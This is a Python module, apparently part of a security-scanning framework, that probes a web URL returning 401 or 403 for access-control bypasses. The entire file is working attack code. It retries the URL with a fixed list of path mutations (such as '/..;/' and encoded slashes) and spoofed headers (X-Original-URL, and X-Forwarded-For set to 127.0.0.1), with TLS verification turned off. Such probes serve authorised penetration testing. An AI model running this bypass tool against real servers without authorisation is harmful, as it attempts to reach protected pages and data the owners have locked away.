"""
Raw execution for acl_bypass_probe: sends a baseline GET to a URL that is
expected to return 401/403, then retries it with a bounded, fixed set of
path mutations and spoofed-origin headers. No parsing here -- parse.py's job.
"""
from __future__ import annotations

import urllib.parse
from dataclasses import dataclass, field
from typing import List, Optional, Tuple

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Tradecraft/1.0"
BLOCKED_STATUSES = (401, 403)


@dataclass
class VariantAttempt:
    label: str
    url: str
    extra_header: Optional[Tuple[str, str]]  # (name, value) or None
    status: Optional[int] = None
    body_length: Optional[int] = None
    error: Optional[str] = None


@dataclass
class RawAclBypassResult:
    target: str = ""
    baseline_status: Optional[int] = None
    baseline_length: Optional[int] = None
    baseline_was_blocked: bool = False
    attempts: List[VariantAttempt] = field(default_factory=list)
    error: Optional[str] = None


def normalize_target_url(target: str) -> str:
    """Ensure target has a valid HTTP/HTTPS scheme."""
    t = target.strip()
    if not t:
        return ""
    if not (t.startswith("http://") or t.startswith("https://")):
        t = f"https://{t}"
    return t


def _build_path_variants(path: str) -> List[Tuple[str, str]]:
    """Returns (label, mutated_path) pairs for the 18 path-mutation rows."""
    rows: List[Tuple[str, str]] = [
        ("trailing_slash", path + "/"),
        ("trailing_dot", path + "/."),
        ("double_slash", path + "//"),
        ("dot_slash", path + "/./"),
        ("semicolon_bypass", path + "/..;/"),
        ("trailing_percent20", path + "%20"),
        ("trailing_percent09", path + "%09"),
        ("trailing_question", path + "?"),
        ("trailing_hash", path + "#"),
        ("trailing_semicolon", path + ";"),
        ("uppercase", path.upper()),
        ("swapcase", path.swapcase()),
        ("leading_dot_segment", "/." + path.lstrip("/")),
        ("leading_double_slash", "//" + path.lstrip("/")),
        ("leading_dot_slash", "/./" + path.lstrip("/")),
        ("leading_semicolon_bypass", "/..;/" + path.lstrip("/")),
    ]
    # Slash-encoding rows only make sense for multi-segment paths.
    if path.count("/") > 1:
        rows.append(("encoded_slash_prefix", path[0] + path[1:].replace("/", "%2f", 1)))
        rows.append(("double_encoded_slash", path[0] + path[1:].replace("/", "%252f", 1)))
    return rows


# (label, header name, header value template). "{path}" is the original path.
_HEADER_VARIANTS: List[Tuple[str, str, str]] = [
    ("x_original_url", "X-Original-URL", "{path}"),
    ("x_rewrite_url", "X-Rewrite-URL", "{path}"),
    ("x_forwarded_for_localhost", "X-Forwarded-For", "127.0.0.1"),
    ("x_forwarded_for_name", "X-Forwarded-For", "localhost"),
    ("x_forwarded_host", "X-Forwarded-Host", "localhost"),
    ("x_forwarded_host_ip", "X-Forwarded-Host", "127.0.0.1"),
    ("x_remote_ip", "X-Remote-IP", "127.0.0.1"),
    ("x_remote_addr", "X-Remote-Addr", "127.0.0.1"),
    ("x_client_ip", "X-Client-IP", "127.0.0.1"),
    ("true_client_ip", "True-Client-IP", "127.0.0.1"),
    ("x_forwarded_for_rfc", "Forwarded", "for=127.0.0.1"),
    ("x_host", "X-Host", "localhost"),
    ("x_forwarded_server", "X-Forwarded-Server", "localhost"),
    ("x_custom_ip_auth", "X-Custom-IP-Authorization", "127.0.0.1"),
]


def execute(target: str, timeout: int = 10) -> RawAclBypassResult:
    if requests is None:
        return RawAclBypassResult(target=target, error="requests library not available")

    url = normalize_target_url(target)
    if not url:
        return RawAclBypassResult(target=target, error="empty target URL")

    headers = {"User-Agent": USER_AGENT}
    try:
        baseline = requests.get(
            url,
            headers=dict(headers),
            timeout=timeout,
            verify=False,
            allow_redirects=False,
        )
    except requests.RequestException as exc:
        return RawAclBypassResult(target=url, error=str(exc))

    baseline_length = len(baseline.content)
    result = RawAclBypassResult(
        target=url,
        baseline_status=baseline.status_code,
        baseline_length=baseline_length,
        baseline_was_blocked=baseline.status_code in BLOCKED_STATUSES,
    )

    parsed = urllib.parse.urlsplit(url)
    path = parsed.path or "/"
    query_suffix = f"?{parsed.query}" if parsed.query else ""
    baseline_url = f"{parsed.scheme}://{parsed.netloc}{path}{query_suffix}"

    def _send(label: str, send_url: str, extra: Optional[Tuple[str, str]]) -> None:
        req_headers = dict(headers)
        if extra is not None:
            req_headers[extra[0]] = extra[1]
        attempt = VariantAttempt(label=label, url=send_url, extra_header=extra)
        try:
            resp = requests.get(
                send_url,
                headers=req_headers,
                timeout=timeout,
                verify=False,
                allow_redirects=False,
            )
            attempt.status = resp.status_code
            attempt.body_length = len(resp.content)
        except requests.RequestException as exc:
            attempt.error = str(exc)
        result.attempts.append(attempt)

    # Skip rows whose URL is the baseline itself, or duplicates an earlier row
    # (e.g. 'leading_dot_segment' and 'leading_dot_slash' both yield '/./admin').
    seen_urls = {baseline_url}
    for label, mutated_path in _build_path_variants(path):
        variant_url = f"{parsed.scheme}://{parsed.netloc}{mutated_path}{query_suffix}"
        if variant_url in seen_urls:
            continue
        seen_urls.add(variant_url)
        _send(label, variant_url, None)

    for label, header_name, template in _HEADER_VARIANTS:
        _send(label, url, (header_name, template.format(path=path)))

    return result
